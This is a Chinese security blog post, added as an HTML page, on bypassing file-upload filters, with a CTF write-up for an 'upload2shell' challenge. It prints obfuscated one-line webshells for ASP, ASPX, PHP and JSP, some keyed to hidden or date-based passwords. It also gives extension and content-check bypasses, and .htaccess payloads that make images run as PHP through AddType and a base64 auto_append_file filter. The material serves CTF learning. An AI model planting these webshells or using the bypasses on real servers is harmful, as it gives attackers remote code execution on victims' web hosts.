@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>文件上传 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="文件上传,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>文件上传</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-07-20
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h4 id="前台js绕过"><a href="#前台js绕过" class="headerlink" title="前台js绕过"></a>前台js绕过</h4><p>一般采用js在前端进行验证，这样的可以直接修改js文件进行绕过，或者先把文件改为图片格式，之后抓包修改后缀名。</p>
+<h4 id="文件后缀名检测"><a href="#文件后缀名检测" class="headerlink" title="文件后缀名检测"></a>文件后缀名检测</h4><p>有白名单方式和黑名单，一般黑名单与白名单相比较更简单一点，绕过方法</p>
+<ul>
+<li>大小写绕过(如test.Php)</li>
+<li>特别文件名字绕过(如 terst.php…   test.asp_)</li>
+<li>双写后缀名绕过(test.phpphp)</li>
+<li>IIS 或者 nginx 文件名解析漏洞</li>
+<li>自动后缀绕过</li>
+</ul>
+<h4 id="文件内容检测绕过"><a href="#文件内容检测绕过" class="headerlink" title="文件内容检测绕过"></a>文件内容检测绕过</h4><p>修改一句话木马内容，添加图片文件头信息，绕过文件内容检测 </p>
+<p>一句话木马简单变形</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ASP:&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;//-7</span><br><span class="line"></span><br><span class="line">ASPX:&lt;%@ Page Language = Jscript %&gt;</span><br><span class="line">&lt;%var/*-/*-*/P/*-/*-*/=/*-/*-*/&quot;e&quot;+&quot;v&quot;+/*-/*-*/</span><br><span class="line">&quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/*-/*-*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*-/*-*/+&quot;s&quot;+&quot;t&quot;+</span><br><span class="line">&quot;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]&quot;+</span><br><span class="line">&quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval</span><br><span class="line">(/*-/*-*/P/*-/*-*/,/*-/*-*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/*-/*-*/);%&gt;//-7</span><br><span class="line"></span><br><span class="line">PHP:&lt;?php $_GET[a]($_GET[b]);?&gt;</span><br><span class="line"></span><br><span class="line">JSP:&lt;%</span><br><span class="line">if(request.getParameter(&quot;f&quot;)!=null)(new </span><br><span class="line">java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>二次变形</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ASP:&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end </span><br><span class="line">if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ASPX:&lt;%@ Page </span><br><span class="line">Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format(&quot;&#123;0:yyyyMMdd&#125;&quot;,DateTime.Now.ToUniversalTime())+&quot;37E4DD20C310142564FC483DB1132F36&quot;,</span><br><span class="line"> &quot;MD5&quot;).ToUpper()],&quot;unsafe&quot;);%&gt;//随日期变化的连接密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP:&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSP：&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="题目writeup"><a href="#题目writeup" class="headerlink" title="题目writeup"></a>题目writeup</h2><h3 id="2019年全国大学生信息安全竞赛华东北分区赛upload2shell"><a href="#2019年全国大学生信息安全竞赛华东北分区赛upload2shell" class="headerlink" title="2019年全国大学生信息安全竞赛华东北分区赛upload2shell"></a>2019年全国大学生信息安全竞赛华东北分区赛upload2shell</h3><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>打开网址只有一个上传页面，推测是文件上传，首先上传一个普通图片试试。</p>
+<p><img src="/article/592e5fba/1563521176547.png" alt></p>
+<p>上传成功够后会显示文件的路径</p>
+<p><img src="/article/592e5fba/1563521129197.png" alt="1563521129197"></p>
+<p>直接访问文件的路径就可以查看图片，上传php文件会显示<code>illegal suffix!</code></p>
+<p>用burp suite抓包，发送到repeater进行测试，当文件内容中含有<code>&lt;?</code>时，会显示<code>&amp;lt;? in contents!</code></p>
+<p>所以大致就是需要绕过后缀名检测和文件内容检测，先突破后缀名识别，载考虑内容检测。</p>
+<p>尝试 <code>test.Php</code> <code>test.phpphp</code> <code>test.php.jpg</code> 00截断  <code>test.php;.jpg</code> 都不行，最后使用 <code>test.php.</code> 成功绕过后缀名检测。</p>
+<p><img src="/article/592e5fba/1563523275116.png" alt></p>
+<p>下一步绕过文件内容检测，因为php的开头必须为&lt;? 所以要不就是绕过检测 要不就是文件内容里没有&lt;?这两个字符。</p>
+<p>经过查资料，可以在js中添加php代码，具体为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;</span><br><span class="line">	@<span class="built_in">eval</span>($_POST[a]);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样文件内容里就没有&lt;?这两个字符了，可以正常上传，上传后使用蚁剑连接，连接后就可以在服务器上找到flag了。</p>
+<p><img src="/article/592e5fba/1563523530090.png" alt="1563523530090"></p>
+<h4 id="另一种方法"><a href="#另一种方法" class="headerlink" title="另一种方法"></a>另一种方法</h4><blockquote>
+<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<p>针对黑名单中未包含.htaccess后缀，可以通过重写解析配置，来达到解析文件的效果</p>
+<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><p>方法一</p>
+<p>.htaccess文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> FileMatch 参数即为文件名的正则匹配</span></span><br><span class="line">&lt;FilesMatch "hhh"&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>将一句话文件名设置为<code>hhh</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hhh</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><p>.htaccess文件内容,这个会将jpg格式的文件以php文件格式进行解析</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+<p>将一句话文件改为jpg后缀</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>将一句话使用base64加密，在设置auto_append_file时进行解密；<code>&lt;?php eval($_POST[1]);</code>base64加密后为<code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</code>因为会检测文件类型 所以添加文件头GIF89a，但是base64解码会将四个字符转换为三个字符。所以文件头写成GIF89a12上传文件 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>
+<p>返回文件地址<code>images/f528764d624db129b32c21fbca0cb8d6/1.jpg</code>。</p>
+<p>构造.htaccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .shell</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.jpg&quot;</span><br></pre></td></tr></table></figure>
+<p>这个的意思是使当前目录解析.shell的文件，并且加载文件后自动添加auto_append_file的内容，直接上传.htaccess会显示<code>exit_imagetype:not image</code>所以添加文件头GIF89a,这样.htaccess 无法生效，所以需要绕过这个检测。</p>
+<p>下面是支持的图片的类型</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Value</th>
+<th style="text-align:left">Constant</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left"><strong>IMAGETYPE_GIF</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left"><strong>IMAGETYPE_JPEG</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">3</td>
+<td style="text-align:left"><strong>IMAGETYPE_PNG</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">4</td>
+<td style="text-align:left"><strong>IMAGETYPE_SWF</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">5</td>
+<td style="text-align:left"><strong>IMAGETYPE_PSD</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">6</td>
+<td style="text-align:left"><strong>IMAGETYPE_BMP</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">7</td>
+<td style="text-align:left"><strong>IMAGETYPE_TIFF_II</strong> (intel byte order)</td>
+</tr>
+<tr>
+<td style="text-align:left">8</td>
+<td style="text-align:left"><strong>IMAGETYPE_TIFF_MM</strong> (motorola byte order)</td>
+</tr>
+<tr>
+<td style="text-align:left">9</td>
+<td style="text-align:left"><strong>IMAGETYPE_JPC</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">10</td>
+<td style="text-align:left"><strong>IMAGETYPE_JP2</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">11</td>
+<td style="text-align:left"><strong>IMAGETYPE_JPX</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">12</td>
+<td style="text-align:left"><strong>IMAGETYPE_JB2</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">13</td>
+<td style="text-align:left"><strong>IMAGETYPE_SWC</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">14</td>
+<td style="text-align:left"><strong>IMAGETYPE_IFF</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">15</td>
+<td style="text-align:left"><strong>IMAGETYPE_WBMP</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">16</td>
+<td style="text-align:left"><strong>IMAGETYPE_XBM</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">17</td>
+<td style="text-align:left"><strong>IMAGETYPE_ICO</strong></td>
+</tr>
+<tr>
+<td style="text-align:left">18</td>
+<td style="text-align:left"><strong>IMAGETYPE_WEBP</strong></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Wireless Bitmap（WBMP）是一种<a href="https://baike.baidu.com/item/移动计算机" target="_blank" rel="noopener">移动计算机</a>设备使用的标准<a href="https://baike.baidu.com/item/图像格式" target="_blank" rel="noopener">图像格式</a>。这种格式特定使用于Wireless Application Protocol（WAP）网页中。WBMP支持1位颜色，即WBMP<a href="https://baike.baidu.com/item/图像" target="_blank" rel="noopener">图像</a>只包含黑色和白色像素，而且不能制作的过大，这样在wap手机里才能被正确显示。</p>
+</blockquote>
+<p><img src="/article/592e5fba/1.png" alt></p>
+<p>在.htaccess中默认#开头行为注释行，以0x00开头同样也是注释行,在十六进制编辑器中加入0x00,第二行是那些内容。</p>
+<p><img src="/article/592e5fba/1563552259925.png" alt="1563552259925"></p>
+<p>上传这个文件</p>
+<p>之后上传1.shell，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+<p>返回路径<code>images/f528764d624db129b32c21fbca0cb8d6/1.shell</code></p>
+<p>访问这个地址，在post中写入密码和命令即可执行。</p>
+<p><img src="/article/592e5fba/1563552749250.png" alt="1563552749250"></p>
+<h4 id="题目关键代码"><a href="#题目关键代码" class="headerlink" title="题目关键代码"></a>题目关键代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$tmp_name)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filesize too big!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!$name)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filename cannot be empty!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name,strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>(!$image_type)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/592e5fba.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/文件上传/">
+              #文件上传
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/f98ca180.html" target="_self">心脏滴血漏洞简单分析与复现</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/ea975567.html" target="_self">两种利用js反弹shell的方式</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
